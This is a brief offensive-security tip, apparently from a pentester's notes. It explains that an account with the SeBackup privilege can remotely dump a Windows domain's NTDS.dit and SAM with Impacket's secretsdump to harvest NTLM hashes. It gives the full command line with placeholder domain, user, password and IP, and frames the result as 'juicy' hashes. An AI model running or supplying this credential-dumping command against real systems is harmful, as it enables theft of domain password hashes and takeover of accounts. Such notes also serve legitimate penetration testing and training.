If you have credentials that have the SeBackUp Permission from `whoami /priv` you can remotely use secretsdump to pull the NTDS.dit and SAM file. 

This will return some juicy NTLM hashes for your viewing pleasure.
 
 `python3.9 /opt/impacket/examples/secretsdump.py '<DOMAIN>/<USER>:<PASSWORD>@<IP>'`